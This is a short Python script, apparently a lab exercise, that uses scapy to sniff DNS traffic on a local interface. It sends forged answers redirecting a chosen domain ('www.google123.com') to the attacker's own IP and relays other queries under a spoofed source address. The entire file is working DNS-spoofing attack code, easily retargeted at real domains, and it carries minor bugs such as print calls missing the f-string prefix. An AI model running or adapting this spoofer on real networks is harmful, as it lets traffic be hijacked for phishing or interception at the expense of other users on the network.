#! /usr/bin/env python3
# Use "dig @127.0.0.1 www.google.com" to test Fowarding
# Use "dig @127.0.0.1 www.google123.com" to test Spoofing

from scapy.all import DNS, DNSQR, DNSRR, IP, send, sniff, sr1, UDP

IFACE = "wlp3s0"   # Or your default interface
DNS_SERVER_IP = "192.168.1.133"  # Your local IP
#MY_ACTUAL_DNS_SERVER_IP = '192.168.0.1'

BPF_FILTER = "udp port 53" 
#and ip dst " + DNS_SERVER_IP

def dns_responder(local_ip: str):

    def forward_dns(orig_pkt: IP):
        print("Forwarding: {orig_pkt[DNSQR].qname}")
        response = sr1(
            IP(dst='192.168.1.1')/UDP(sport=orig_pkt[UDP].sport)/DNS(rd=1, id=orig_pkt[DNS].id, qd=DNSQR(qname=orig_pkt[DNSQR].qname)),
            verbose=0,
        )
        resp_pkt = IP(dst=orig_pkt[IP].src, src=DNS_SERVER_IP)/UDP(dport=orig_pkt[UDP].sport)/DNS()
        resp_pkt[DNS] = response[DNS]
        send(resp_pkt, verbose=0)
        return "Responding to {orig_pkt[IP].src}"

    def get_response(pkt: IP):
        if (
            DNS in pkt and
            pkt[DNS].opcode == 0 and
            pkt[DNS].ancount == 0
        ):
            if "www.google123.com" in str(pkt["DNS Question Record"].qname):
                spf_resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,rcode=0,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname, rdata=local_ip)/DNSRR(rrname="www.google123.com",rdata=local_ip))
                print(spf_resp[DNS].show())
                send(spf_resp, verbose=0, iface=IFACE)
                return f"Spoofed DNS Response Sent: {pkt[IP].src}"

            else:
                # make DNS query, capturing the answer and send the answer
                return forward_dns(pkt)

    return get_response

sniff(filter=BPF_FILTER, prn=dns_responder(DNS_SERVER_IP), iface=IFACE)

